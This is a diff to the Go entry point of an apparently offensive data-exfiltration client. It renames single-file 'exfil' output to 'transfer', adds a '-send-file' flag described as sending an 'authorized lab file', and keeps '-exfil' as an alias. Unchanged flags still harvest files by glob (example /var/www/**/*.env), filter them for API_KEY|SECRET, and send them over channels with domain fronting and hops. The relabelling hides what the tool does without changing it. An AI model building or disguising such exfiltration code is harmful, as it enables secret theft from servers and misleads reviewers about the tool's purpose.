@@ -51,7 +51,8 @@ func main() {
 	reconnect := flag.Bool("reconnect", false, "auto-reconnect on disconnection")
 	maxRetries := flag.Int("retries", 10, "max reconnection attempts")
 
-	exfilFile := flag.String("exfil", "", "fire-and-forget file exfiltration: path to file to exfiltrate")
+	sendFile := flag.String("send-file", "", "send one authorized lab file to the receiver")
+	exfilFile := flag.String("exfil", "", "deprecated alias for -send-file")
 	exfilGlob := flag.String("exfil-glob", "", "glob-based file exfiltration: pattern (e.g. /var/www/**/*.env)")
 	exfilFilter := flag.String("exfil-filter", "", "content filter regex for exfil-glob (e.g. API_KEY|SECRET)")
 	exfilMaxSize := flag.Int64("exfil-max", 10485760, "max file size for exfil-glob (default 10MB)")
@@ -73,6 +74,12 @@ func main() {
 		fmt.Println(buildinfo.String())
 		return
 	}
+
+	transferFile, err := resolveTransferFile(*exfilFile, *sendFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+	*exfilFile = transferFile
 
 	if *dnsRecon {
 		runDNSRecon()
@@ -183,12 +190,12 @@ func main() {
 }
 
 func runExfilSingle(filePath, chType, addr, key string, ecdhe bool, domain, frontDomain, hop string, canary bool) {
-	fmt.Printf("[exfil] reading %s...\n", filePath)
+	fmt.Printf("[transfer] reading %s...\n", filePath)
 	entry, err := exfil.ReadFile(filePath)
 	if err != nil {
-		log.Fatalf("exfil: %v", err)
+		log.Fatalf("transfer: %v", err)
 	}
-	fmt.Printf("[exfil] %s — %d bytes\n", entry.Path, entry.Size)
+	fmt.Printf("[transfer] %s — %d bytes\n", entry.Path, entry.Size)
 
 	var ch channel.Channel
 	var sessionKey []byte
@@ -225,10 +232,20 @@ func runExfilSingle(filePath, chType, addr, key string, ecdhe bool, domain, fron
 
 	resp := recvMsg(ch, cryptoSes)
 	if resp != nil && resp.Type == protocol.MsgExfilAck {
-		fmt.Printf("[exfil] server ack: %s\n", string(resp.Payload))
+		fmt.Printf("[transfer] receiver ack: %s\n", string(resp.Payload))
 	} else {
-		fmt.Println("[exfil] data sent (fire-and-forget)")
+		fmt.Println("[transfer] data sent; verify it at the receiver")
 	}
+}
+
+func resolveTransferFile(legacy, current string) (string, error) {
+	if legacy != "" && current != "" {
+		return "", fmt.Errorf("use either -send-file or deprecated -exfil, not both")
+	}
+	if current != "" {
+		return current, nil
+	}
+	return legacy, nil
 }
 
 func runExfilGlob(pattern, filter string, maxSize int64, chType, addr, key string, ecdhe bool, domain, frontDomain, hop string, canary bool) {
